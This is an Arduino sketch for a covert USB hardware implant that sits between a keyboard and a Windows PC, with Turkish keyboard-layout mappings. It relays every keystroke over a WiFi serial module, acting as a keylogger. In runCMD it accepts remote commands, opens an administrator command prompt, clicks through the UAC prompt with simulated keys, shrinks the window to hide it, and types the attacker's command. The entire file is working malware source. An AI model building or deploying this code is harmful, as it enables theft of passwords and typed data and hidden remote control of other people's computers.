#include <SoftwareSerial.h>

SoftwareSerial keyboardSerial(9, 7); // RX, TX
SoftwareSerial wifiSerial(10, 6); //RX, TX

#include "Keyboard.h"
void runCMD(String,bool);
void writeFile(String, String);




bool wifiStatus = false ;
int language = 0; //EN = 0, TR = 1
char flag_esc=0;
int press_count=0;
int inByte=0;
int lastByte=1;
String keyname = "";
void setup() {
  Serial.begin(9600);
  Serial.println("started");
  wifiSerial.begin(9600);
  keyboardSerial.begin(9600);
  Keyboard.begin(); 
 //runCMD("test",true);keyboardSerial
   pinMode(wifiStatus, INPUT);
   
}
void readIncomingCommand()
{


 wifiSerial.listen();
 


  if(wifiSerial.available() > 0) {
     String command = wifiSerial.readString();
     Serial.println(command);

   String parsedCommand = "";
   int dataStartPos = command.indexOf("user");
   int dataEndPos = command.indexOf("_end_");

   if(dataStartPos > -1 && dataEndPos > -1)
   {
    while(dataStartPos < dataEndPos)
    {
      parsedCommand += command[dataStartPos];

      dataStartPos++;
    }
   }
   Serial.println("parsed: " + parsedCommand);
   if(command.indexOf("ps_link") > -1)
   {   
    runCMD(parsedCommand,true);
    wifiStatus = false;
   }
   else if(command.indexOf("cmd_command") > -1)
   {
    runCMD(parsedCommand,true);
     wifiStatus = false;
    
   }  
  }

}





void loop() {

 
  
  if(inByte != 27)
  readIncomingCommand();
  
  keyboardSerial.listen();

  
  int SS = analogRead(8);
  //Serial.println(SS);
  if (SS < 100)
      Keyboard.releaseAll();
  
  
  if (keyboardSerial.available() > 0)  
  {
    inByte = keyboardSerial.read();
   Serial.println(inByte);

    if(inByte == 27)
    {
       flag_esc = 1;
    }   
    else
    {
      if(flag_esc==1)
      {
        
        lastByte = 27;
        bool pressFlag=false;
        // Previous char was ESC - Decode all the escaped keys
        switch(inByte)
        {
            case 0x49:
            Serial.print("[PgUp]");                      
            keyname = "[PgUp]";
            Keyboard.write(KEY_PAGE_UP);
            pressFlag=true;             
              break;
            case 0x51:
            Serial.print("[PgDn]");
            keyname = "[PgDn]";
            Keyboard.write(KEY_PAGE_DOWN);
              break; 
                  
            case 0x47:
            Serial.print("[HOME]");
            keyname = "[HOME]";
            Keyboard.write(KEY_HOME);
            pressFlag=true;             
              break;
              
            case 79:
            Serial.print("[END]");
            keyname = "[END]";
            Keyboard.write(KEY_END);
            pressFlag=true;                
              break;     
             
            case 82:
            Serial.print("[INSERT]");
            keyname = "[INSERT]";
            Keyboard.write(KEY_INSERT);
            pressFlag=true;            
              break;
              
            case 83:
            Serial.print("[DELETE]");
            keyname = "[DELETE]";
            Keyboard.press(KEY_DELETE);
            pressFlag=true;              
              break;
                             
            case 59:
            Serial.print("[F1]");
            keyname = "[F1]";
            Keyboard.write(KEY_F1);
            pressFlag=true;             
              break;
              
            case 60:
            Serial.print("[F2]");
            keyname = "[F2]";
            Keyboard.write(KEY_F2);
            pressFlag=true; 
              break;   
               
            case 61:
            Serial.print("[F3]");
            keyname = "[F3]";
            Keyboard.write(KEY_F3);
            pressFlag=true; 
              break;
              
            case 62:
            Serial.print("[F4]");
            keyname = "[F4]";      
            Keyboard.write(KEY_F4);
            pressFlag=true; 
              break; 
                  
            case 63:
            Serial.print("[F5]");
            keyname = "[F5]";           
            Keyboard.write(KEY_F5);
            pressFlag=true; 
              break;
              
            case 64:
            Serial.print("[F6]");
            keyname = "[F6]";
            Keyboard.write(KEY_F6);
            pressFlag=true; 
              break;    
                    
            case 65:
            Serial.print("[F7]");
            keyname = "[F7]";
            Keyboard.write(KEY_F7);
            pressFlag=true; 
              break; 
              
            case 66:
            Serial.print("[F8]");
            keyname = "[F8]";             
            Keyboard.write(KEY_F8);
            pressFlag=true; 
              break; 
              
            case 67:
            Serial.print("[F9]");
            keyname = "[F9]";
            Keyboard.write(KEY_F9);
            pressFlag=true; 
              break; 
              
            case 68:
             Serial.print("[F10]");
             keyname = "[F10]";
             Keyboard.write(KEY_F10); 
             pressFlag=true;   
              break; 
              
            case 87:
             Serial.print("[F11]");
             keyname = "[F11]";
             Keyboard.write(KEY_F11);
             pressFlag=true; 
              break;
               
            case 88:
             Serial.print("[F12]");
             keyname = "[F12]";
             Keyboard.write(KEY_F12);
             pressFlag=true; 
              break;     
              
            case 72:
             Serial.print("[KEY_UP]");
             keyname = "[KEY_UP]";
             Keyboard.write(KEY_UP_ARROW);
             pressFlag=true; 
              break; 
              
            case 80:
              Serial.print("[KEY_DOWN]");
              keyname = "[KEY_DOWN]";
              Keyboard.write(KEY_DOWN_ARROW);
              pressFlag=true;              
              break;
               
            case 75:
             Serial.print("[KEY_LEFT]");
             keyname = "[KEY_LEFT]";
              Keyboard.write(KEY_LEFT_ARROW);
              pressFlag=true; 
              break; 
              
            case 77:
             Serial.print("[KEY_RIGHT]"); 
             keyname = "[KEY_RIGHT]";            
             Keyboard.write(KEY_RIGHT_ARROW);
             pressFlag=true; 
              break;           
             
            case 91:
              Serial.print("[Windows]");
              keyname = "[Windows]";
              Keyboard.write(KEY_LEFT_GUI);
              pressFlag=true; 
              break;

//KEY DEFINITIONS
            
              
            default:
              Serial.print("[?]");
              Serial.println(inByte);
              break;            
        }
     
        if(!pressFlag)
        keyboardLanguageSelect(inByte); 
        
        flag_esc=0;    
      }
      else
      {  
        if(inByte < 27)
        {
         switch(inByte)
        {
          case 1:
           Serial.print("Control-A");
           
           keyname = "Control-A";           
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('a');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 2:
           Serial.print("Control-B");
           keyname = "Control-B";
           
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('b');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 3:
           Serial.print("Control-C");
           keyname = "Control-C";
           
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('c');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 4:
          Serial.print("Control-D");
          keyname = "Control-D";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('d');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 5:
          Serial.print("Control-E");
          keyname = "Control-E";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('e');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 6:
           Serial.print("Control-F");
           keyname = "Control-F";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('f');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 7:
           Serial.print("Control-G");
           keyname = "Control-G";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('g');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 11:
           Serial.print("Control-K");
           keyname = "Control-K";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('k');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 12:
           Serial.print("Control-L");
           keyname = "Control-L";

           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('l');

           delay(5);

           Keyboard.releaseAll();

          case 13:
           Serial.print("ENTER");
           keyname = "ENTER";

           Keyboard.press(KEY_RETURN);
           

           delay(5);

           Keyboard.releaseAll();
          break;

          case 14:
           Serial.print("Control-N");
           keyname = "Control-N";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('n');

           delay(5);

           Keyboard.releaseAll();          
          break;

          case 15:
           Serial.print("Control-O");
           keyname = "Control-O";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('o');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 16:
           Serial.print("Control-P");
           keyname = "Control-P";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('p');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 17:
           Serial.print("Control-Q");
           keyname = "Control-Q";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('q');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 18:
           Serial.print("Control-R");
           keyname = "Control-R";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('r');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 19:
           Serial.print("Control-S");
           keyname = "Control-S";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('s');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 20:
           Serial.print("Control-T");
           keyname = "Control-T";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('t');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 21:
           Serial.print("Control-U");
           keyname = "Control-U";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('u');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 22:
           Serial.print("Control-V");
           keyname = "Control-V";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('v');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 23:
           Serial.print("Control-W");
           keyname = "Control-W";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('w');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 24:
           Serial.print("Control-X");
           keyname = "Control-X";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('x');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 25:
           Serial.print("Control-Y");
           keyname = "Control-Y";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('y');

           delay(5);

           Keyboard.releaseAll();
          break;

          case 26:
           Serial.print("Control-Z");
           keyname = "Control-Z";
                      
           Keyboard.press(KEY_LEFT_CTRL);
           Keyboard.press('z');

           delay(5);

           Keyboard.releaseAll();
          break;        
          
        }
        
        }

     //solving abnormals
     


    
     
    //Keyboard.press(inByte);
      //char key = inByte;
      keyboardWriteTR(inByte); 
       //Serial.print(key); 
     

     
     lastByte=inByte;
      
         

 //keyboardPrintTR("£");
 
        }  
      }
    }  


  } 
//Keyboard functions
#define unlem 33
#define buyuki 39
#define ust 35
#define arti 36
#define yuzde 37

#define tri 105 // ı
#define btri 73 // II

#define normali 188 // i
#define bnormali 34 // i

#define sagparantez 40 // )
#define esit 41
#define solparantez 42 // (
#define alttire 43

#define tro 44 // ö
#define btro 60 // ö

#define yildiz 45 // *

#define trc 191 // ç
#define btrc 62 // Ç

#define bosluk 180 // 
#define tire 61 // -

#define yumusakg 91 //ğ
#define byumusakg 123 //Ğ

#define tru 93 //ü
#define btru 125 //Ü

#define virgul 185 // ,

#define trs 59 // ş
#define btrs  58// Ş

#define cifttirnak 96 // "
#define nokta 47 // .
#define noktavirgul 124 // ;
#define tektirnak 64 // '
#define ikinokta 63 // :
#define slash 38 // //
#define tersslash 220 // //
#define vesembol 94 // //
#define solok 236 // <
#define sagok 94 // >
#define ev 35 // ^

void keyboardLanguageSelect(byte inByte){
  
  switch(language)
  {
    case 1: 
    keyboardWriteTR(inByte);
    break;

    case 0: 
    break;

    default: break;
  }
}

void keyboardWriteTR(byte inByte){      
     
      
     Serial.println("inByte:" + String(inByte));
     Serial.println("LastByte:" + String(lastByte));
     
    wifiSerial.listen();
    if(lastByte != 27)
    {
     switch(inByte)
     {
      case 34: 
      Keyboard.press(tektirnak);
      keyname = '\'';
      
      break;
      case 47: 
      Keyboard.press(tersslash);
      keyname = "/";
      
      break;
      case 42: 
      Keyboard.press(yildiz);
      keyname = "*";
      
      break;
      case 45: 
      Keyboard.press(tire);
      keyname = "-";
      
      break;
      case 43: 
      Keyboard.press(arti);
      keyname = "+";
      
      break;
      case 163:
      if (lastByte == 194) 
       Keyboard.press(51);
       Keyboard.press(KEY_LEFT_SHIFT);
       Keyboard.releaseAll();

       keyname="^";
      break;
            
      case 92:
      Keyboard.press(solok);
      keyname = "<";
      break;
      
      case 124: // >
       Keyboard.press(KEY_LEFT_SHIFT);       
       Keyboard.press(solok);
       Keyboard.releaseAll();

      keyname = ">";
      break;
      
      case 35:
      Keyboard.press(virgul); 
      keyname = ",";
      break;

      case 126: //;
      Keyboard.press(noktavirgul); 
      keyname = ";";
      break;
      
      default:
      if (inByte != 194 || inByte != 27)
      Keyboard.press(inByte);
      char ckey = inByte;

      keyname += ckey;
      
      break;
     }
     
     wifiSerial.print(keyname);
    }
    else // condition:lastByte = 27
    {
      Keyboard.press(KEY_RIGHT_ALT);

      wifiSerial.print("[ALT_GR]" + inByte);

      switch(inByte)
      {
        case 16: Keyboard.press(113); break;

        case 18: Keyboard.press(101); break;

        case 20: Keyboard.press(116); break;

        case 23: Keyboard.press(105); break;

        case 30: Keyboard.press(97); break;

        case 26: Keyboard.press(115); break;

        case 35: Keyboard.press(185); break;

        case 92: Keyboard.press(solok); break;

        default: Keyboard.press(inByte); break;
        
      }
    }
    keyname = "";
}

int TRlastByte = 0;

void keyboardPrintTR(String payload){


  for(char c : payload){
     int char_no = c;
     
      
     Serial.print("here:" + String(char_no));

    
    switch(c){
     case ' ': Keyboard.write(bosluk); break;
     case '/': Keyboard.write(slash); break;
     case ':': Keyboard.write(ikinokta); break;
     case '\'': Keyboard.write(tektirnak); break;
     case ';': Keyboard.write(noktavirgul); break;
     case '(': Keyboard.write(solparantez); break;
     case ')': Keyboard.write(sagparantez); break;
     case '*': Keyboard.write(yildiz); break;
     case '-': Keyboard.write(tire); break;
     case -97:
     if(TRlastByte == -60)
     Keyboard.write(yumusakg);
     else if(TRlastByte == -59)
     Keyboard.write(trs);
     break;
     case -98: Keyboard.write(byumusakg); break;
     case -68: Keyboard.write(tru); break;
     case -100: Keyboard.write(tru); break;
     case ',': Keyboard.write(virgul); break;
     //case 'ş': Keyboard.write(trs); break;
     case -79: Keyboard.write(tri); break;
     case -80:
     Keyboard.press(KEY_RIGHT_ALT); 
     Keyboard.press(btri);
     Keyboard.releaseAll();
     break;
     case 105: Keyboard.write(normali); break;
     case 94: Keyboard.write(ev); break;
     case '"': Keyboard.write(cifttirnak); break;
     case -74: Keyboard.write(tro); break;
     case -106: Keyboard.write(btro); break;
     case -89: Keyboard.write(trc); break;
     case -121: Keyboard.write(btrc); break;
     case 46: Keyboard.write(nokta); break;
     case 43: Keyboard.write(arti); break;
     case '=': Keyboard.write(esit); break;
     
     case 92: //key : |
     Keyboard.press(KEY_RIGHT_ALT); 
     Keyboard.press(45);
     Keyboard.releaseAll();
     break;
     
     case 38: Keyboard.write(vesembol); break;
     case 60: Keyboard.write(solok); break;
     case 62:
     Keyboard.press(KEY_LEFT_SHIFT);
     Keyboard.press(solok); 
     Keyboard.releaseAll();
     break;
     case 124: 
     Keyboard.press(KEY_RIGHT_ALT);       
     Keyboard.press(solok);
     Keyboard.releaseAll();
     break;

     case 123: // key : {
     Keyboard.press(KEY_RIGHT_ALT);       
     Keyboard.press(55);
     Keyboard.releaseAll();
     break;
     
     case 125: // key : {
     Keyboard.press(KEY_RIGHT_ALT);       
     Keyboard.press(48);
     Keyboard.releaseAll();
     break;
     
     case 91: // key : [
     Keyboard.press(KEY_RIGHT_ALT);       
     Keyboard.press(56);
     Keyboard.releaseAll();
     break;
     
     case 93: // key : ]
     Keyboard.press(KEY_RIGHT_ALT);       
     Keyboard.press(57);
     Keyboard.releaseAll();
     break;

     case 95: // key : _
     Keyboard.press(KEY_LEFT_SHIFT);
     Keyboard.press(61); 
     Keyboard.releaseAll();
     break;

     case 63: // key : ?
     Keyboard.press(KEY_LEFT_SHIFT);
     Keyboard.press(45); 
     Keyboard.releaseAll();
     break;
/*
     case -93: // key : £
     Keyboard.press(KEY_LEFT_ALT);
     Keyboard.press(50); 
     Keyboard.releaseAll();
     break;

     case 96: // key : `
     Keyboard.press(KEY_RIGHT_ALT);       
     Keyboard.press(35);
     Keyboard.releaseAll();
     Keyboard.write(32);
     break;
 */
     default:
     if(char_no != -60 || char_no != -62) 
     Keyboard.write(c); break;
     ;
    }
    TRlastByte = char_no;
  }
}


//windows + r
void windowsRun(){
 Keyboard.press(KEY_LEFT_GUI);
 Keyboard.press('r');

 Keyboard.releaseAll();
}

void runCMD(String command, bool isAdmin)
{
 windowsRun();
 delay(100);

 if(isAdmin)
 {
 keyboardPrintTR("cmd");
 delay(100);
 Keyboard.press(KEY_LEFT_CTRL);
 Keyboard.press(KEY_LEFT_SHIFT);
 Keyboard.press(KEY_RETURN);
 delay(1000);
 
 Keyboard.press(KEY_LEFT_ARROW);
 delay(100);
 Keyboard.releaseAll();
 Keyboard.write(KEY_RETURN);
  }
  else
  {
    keyboardPrintTR("cmd");
    delay(100);
    Keyboard.write(KEY_RETURN);
  }
  delay(300);
  keyboardPrintTR("mode con:cols=20 lines=1");
  Keyboard.write(KEY_RETURN);
 
  
  
  
  
 
  
  keyboardPrintTR(command);
  
}

  
